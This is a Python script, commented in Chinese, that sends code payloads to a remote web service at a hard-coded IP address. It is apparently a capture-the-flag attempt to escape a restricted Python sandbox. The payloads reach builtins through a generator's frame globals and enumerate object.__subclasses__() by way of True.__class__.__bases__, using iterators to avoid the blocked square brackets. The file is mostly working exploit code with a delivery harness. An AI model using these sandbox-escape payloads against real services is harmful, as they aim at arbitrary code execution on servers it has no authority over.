import requests
import html

url = "http://114.66.24.228:33479/"

def test(code):
    resp = requests.post(url, data={"code": code})
    s = resp.text
    if 'output-area">' in s:
        start = s.find('output-area">') + len('output-area">')
        end = s.find('</div>', start)
        return html.unescape(s[start:end].strip())
    return "No output"

# bi.get("open") 返回 None
# 让我检查 bi 有多少项
code = '''
g=(c for c in ())
f=g.gi_frame
gl=f.f_globals
cp=gl.copy()
vs=(v for v in cp.values())
bi=vs.send(None)
ln=len(bi)
ln()
'''
print("bi长度:", test(code))

# 枚举 bi 的 keys
code = '''
g=(c for c in ())
f=g.gi_frame
gl=f.f_globals
cp=gl.copy()
vs=(v for v in cp.values())
bi=vs.send(None)
ks=(k for k in bi)
a=ks.send(None)
a()
'''
print("bi第一个key:", test(code))

# 试试从代码对象获取其他函数引用
# 在限制环境中，可能有些函数被保留了
# 比如 True.__class__.__bases__[0].__subclasses__()

# 但我们没有 []，用迭代器
code = '''
t=True
c=t.__class__
b=c.__bases__
it=(x for x in b)
ob=it.send(None)
ob()
'''
print("object类:", test(code))

# 获取 object.__subclasses__()
code = '''
t=True
c=t.__class__
b=c.__bases__
it=(x for x in b)
ob=it.send(None)
sc=ob.__subclasses__
ls=sc()
ln=len(ls)
ln()
'''
print("subclasses长度:", test(code))
